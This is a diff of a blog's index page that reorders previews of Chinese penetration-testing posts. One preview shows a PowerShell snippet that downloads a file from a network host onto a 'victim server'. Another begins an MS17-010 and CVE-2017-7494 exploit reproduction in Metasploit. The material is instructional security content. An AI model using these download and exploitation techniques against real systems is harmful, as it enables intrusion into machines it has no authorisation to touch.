@@ -343,6 +343,56 @@ ls /boot | grep vmlinuz...</code></pre>
             
             October 04, 2019
         </p>
+        <h3 class="post-title animated fadeInDown"><a href="/knlvre.github.io/2019/10/04/十三种方式下载文件/" title="十三种方式下载文件" class="posttitle">十三种方式下载文件</a></h3>
+        
+            <p class="post-count animated fadeInDown">
+                
+                    <span>
+                        <b class="iconfont icon-text2"></b> <i>Words count</i>
+                        5.7k
+                    </span>
+                
+                
+                    <span>
+                        <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
+                        5 mins.
+                    </span>
+                
+                
+            </p>
+            
+                <ul class="animated fadeInDown post-tags-list"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/knlvre.github.io/tags/渗透测试/">渗透测试</a></li></ul>
+            
+        
+        <div class="md-content animated fadeIn">
+            
+                <p>本文转载自原文：<a href="https://evi1cg.me/archives/13-ways-to-download-a-file.html" target="_blank" rel="noopener">13种方式下载文件</a></p>
+<p>渗透测试过程中常常遇到需要将文件下载到受害者服务器上，这里介绍15种下载文件的方式，希望能帮助到你。</p>
+<p>创建如下PSH脚本：</p>
+<pre><code class="bash">$p = New-Object System.Net.WebClient
+$p.DownloadFile(&quot;http://domain/file&quot;,&quot;C:%homepath%file&quot;)
+
+如：$p.DownloadFile(&quot;http://192.168.0.111:3737/test.txt...</code></pre>
+            
+            <span class="read-more"><a href="/knlvre.github.io/2019/10/04/十三种方式下载文件/" title="Read article" class="posttitle">Read article</a> <b class="iconfont icon-arrow-right- gradient-text"></b></span>
+        </div>
+    </div>
+</div>
+
+
+<div class="post" id="post">
+    <div class="post-cover animated fadeIn" style="
+            background-image:
+            radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
+            url(/img/welcome-cover.jpg);">
+    </div>
+    <div class="else">
+        <p class="animated fadeInDown">
+            
+                <a href="javascript:;"><b>「 </b>Article<b> 」</b></a>
+            
+            October 04, 2019
+        </p>
         <h3 class="post-title animated fadeInDown"><a href="/knlvre.github.io/2019/10/04/Windows系统添加补丁/" title="Windows系统添加补丁" class="posttitle">Windows系统添加补丁</a></h3>
         
             <p class="post-count animated fadeInDown">
@@ -378,56 +428,6 @@ ls /boot | grep vmlinuz...</code></pre>
 <p>Windows系统自带补丁安装程序：<code>wusa</code>。命令...</p>
             
             <span class="read-more"><a href="/knlvre.github.io/2019/10/04/Windows系统添加补丁/" title="Read article" class="posttitle">Read article</a> <b class="iconfont icon-arrow-right- gradient-text"></b></span>
-        </div>
-    </div>
-</div>
-
-
-<div class="post" id="post">
-    <div class="post-cover animated fadeIn" style="
-            background-image:
-            radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
-            url(/img/welcome-cover.jpg);">
-    </div>
-    <div class="else">
-        <p class="animated fadeInDown">
-            
-                <a href="javascript:;"><b>「 </b>Article<b> 」</b></a>
-            
-            October 04, 2019
-        </p>
-        <h3 class="post-title animated fadeInDown"><a href="/knlvre.github.io/2019/10/04/十三种方式下载文件/" title="十三种方式下载文件" class="posttitle">十三种方式下载文件</a></h3>
-        
-            <p class="post-count animated fadeInDown">
-                
-                    <span>
-                        <b class="iconfont icon-text2"></b> <i>Words count</i>
-                        5.7k
-                    </span>
-                
-                
-                    <span>
-                        <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
-                        5 mins.
-                    </span>
-                
-                
-            </p>
-            
-                <ul class="animated fadeInDown post-tags-list"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/knlvre.github.io/tags/渗透测试/">渗透测试</a></li></ul>
-            
-        
-        <div class="md-content animated fadeIn">
-            
-                <p>本文转载自原文：<a href="https://evi1cg.me/archives/13-ways-to-download-a-file.html" target="_blank" rel="noopener">13种方式下载文件</a></p>
-<p>渗透测试过程中常常遇到需要将文件下载到受害者服务器上，这里介绍15种下载文件的方式，希望能帮助到你。</p>
-<p>创建如下PSH脚本：</p>
-<pre><code class="bash">$p = New-Object System.Net.WebClient
-$p.DownloadFile(&quot;http://domain/file&quot;,&quot;C:%homepath%file&quot;)
-
-如：$p.DownloadFile(&quot;http://192.168.0.111:3737/test.txt...</code></pre>
-            
-            <span class="read-more"><a href="/knlvre.github.io/2019/10/04/十三种方式下载文件/" title="Read article" class="posttitle">Read article</a> <b class="iconfont icon-arrow-right- gradient-text"></b></span>
         </div>
     </div>
 </div>
@@ -500,13 +500,13 @@ $p.DownloadFile(&quot;http://domain/file&quot;,&quot;C:%homepath%file&quot;)
             
             September 24, 2019
         </p>
-        <h3 class="post-title animated fadeInDown"><a href="/knlvre.github.io/2019/09/24/MS17-010（CVE-2017-0143）复现/" title="MS17-010（CVE-2017-0143）& CVE-2017-7494 复现" class="posttitle">MS17-010（CVE-2017-0143）& CVE-2017-7494 复现</a></h3>
+        <h3 class="post-title animated fadeInDown"><a href="/knlvre.github.io/2019/09/24/MS17-010（CVE-2017-0143）& CVE-2017-7494 复现/" title="MS17-010（CVE-2017-0143）& CVE-2017-7494 复现" class="posttitle">MS17-010（CVE-2017-0143）& CVE-2017-7494 复现</a></h3>
         
             <p class="post-count animated fadeInDown">
                 
                     <span>
                         <b class="iconfont icon-text2"></b> <i>Words count</i>
-                        15k
+                        16k
                     </span>
                 
                 
@@ -529,14 +529,15 @@ $p.DownloadFile(&quot;http://domain/file&quot;,&quot;C:%homepath%file&quot;)
 <p>靶机：Linux docker（IP：192.168.199.186）</p>
 <p>本文章复现的两个CVE分别是针对 Windows 和 Linux 445端</p>
 <p>打开MSF</p>
-<pre><code>msfconsole
-</code></pre><p>查找<code>search ms17-010</code></p>
-<pre><code>msf5 &gt; search ms17-010
+<pre><code class="code">msfconsole
+</code></pre>
+<p>查找<code>search ms17-010</code></p>
+<pre><code class="msfconsole">msf5 &gt; search ms17-010
 
 Matching Modules
-=======...</code></pre>
+======...</code></pre>
             
-            <span class="read-more"><a href="/knlvre.github.io/2019/09/24/MS17-010（CVE-2017-0143）复现/" title="Read article" class="posttitle">Read article</a> <b class="iconfont icon-arrow-right- gradient-text"></b></span>
+            <span class="read-more"><a href="/knlvre.github.io/2019/09/24/MS17-010（CVE-2017-0143）& CVE-2017-7494 复现/" title="Read article" class="posttitle">Read article</a> <b class="iconfont icon-arrow-right- gradient-text"></b></span>
         </div>
     </div>
 </div>
